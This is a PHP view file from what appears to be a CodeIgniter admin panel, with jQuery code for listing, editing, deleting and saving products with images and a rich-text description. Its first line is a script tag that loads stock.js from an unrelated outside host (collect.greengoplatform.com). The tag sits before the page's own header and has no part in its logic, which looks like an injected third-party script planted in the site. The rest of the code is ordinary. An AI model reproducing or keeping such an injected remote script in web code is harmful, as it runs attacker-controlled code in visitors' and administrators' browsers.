<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>
<?php $data[$this->pages]=$this->produk;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->produk,$baseView,$this->modalFullScreen); ?>

<script>
    var urlLocal    = `${strMasterData}/${strProduk}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strNama);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var wrapImg     = attrId(strwrapImg);
    var quill;
    var noImg=1;
    var no=1;
    $(document).ready(function() {
        quill = setCkeditor(strDeskripsi);
        var arrSelect = [strKategori,strModel,strPlatform];
        arrSelect.forEach(function(row){setSelect(base_url+`${strMasterData}/${row}/${strGetAll}`,row);});
        loadData();
    });

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }
    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }
    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                setFocus(strNama);
                var data        = res.res_data;
                var resImg      = data[strGambar].split(",");
                var html        = '';
                var dataId      = [strId,strNama,strDeskripsi,strKategori,strModel,strStatus];
                var dataSelect  = [strPlatform];
                dataId.forEach(function(row){row===strDeskripsi?setQuill(quill,data[strDeskripsi]):setIdSelect(row,data[row]);})
                dataSelect.forEach(function(row){setValueSelect(row, JSON.parse(data[row]))});
                for(let i=0;i<resImg.length;i++){
                    noImg=i;
                    html+=tempFieldImage({no:i});
                    timeOut(function(){setFileImage(resImg[i],strProduk,i)})
                }
                wrapImg.html(html);
            } else {
                notif(strError);
            }
        });
    }
    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }
    formInput.validate({
        rules: {
            nama: {required: true},
            "platform[]": { required:true }
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            var img="<?=$this->noImage?>";
            for(let i=0;i<noImg;i++){
                let no=i+1;
                let valImg=attrId(`${strResultImage}_${no}`).attr("src");
                if(valImg===img){
                    setFocus(`${strFileUpload}_${no}`);
                    timeOut(function(){location.hash=`#${strFileUpload}_${no}`});
                    return;
                }
            }
            if(!validateQuill(quill.container.innerText,null,100)){
                timeOut(function(){quill.focus();});
                return;
            }

            var formData=new FormData(formInput[0]);
            var myEditor = document.querySelector(`#${strDeskripsi}`);
            var html = myEditor.children[0].innerHTML;
            formData.append(strDeskripsi, html);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName && paramForm.val()===strEdit) anyPage.val("");
                        loadData(page,false);
                        notif(strSuccess);
                        delForm(formInput);
                        paramForm.val(strAdd);
                        modalForm.modal(strHide);
                    });


                } else {
                    notif(strFailed);
                }
            })
        }
    });
    modalForm.on(strHideModal, function () {
        noImg = 1;
        delForm(formInput);
        delValueSelect(strPlatform)
        timeOut(function(){
            delQuill(quill);
            wrapImg.html(tempFieldImage({no:noImg}));
        })
    });
    modalForm.on(strShowModal, function () {
        var resImg=tempFieldImage({no:1});
        noImg=1;
        wrapImg.html(resImg);
        timeOut(function(){location.hash=`#${strFileUpload}_${noImg}`})
    });
    function addImage(){
        if(noImg<5){
            noImg = noImg+1;
            let resImg=tempFieldImage({no:noImg});
            wrapImg.append(resImg);
            timeOut(function(){location.hash=`#${strFileUpload}_${noImg}`})
        }
        else{
            notif(strError,`${strNotifMaxInput} 5`);
        }

    }
    function delImage(){
        var isValid=paramForm.val()===strAdd?1:0;
        if(noImg>isValid){
            attrId("wrapInputImg_"+noImg).remove();
            noImg = noImg-1;
            timeOut(function(){location.hash=`#${strFileUpload}_${noImg}`})
        }
    }


</script>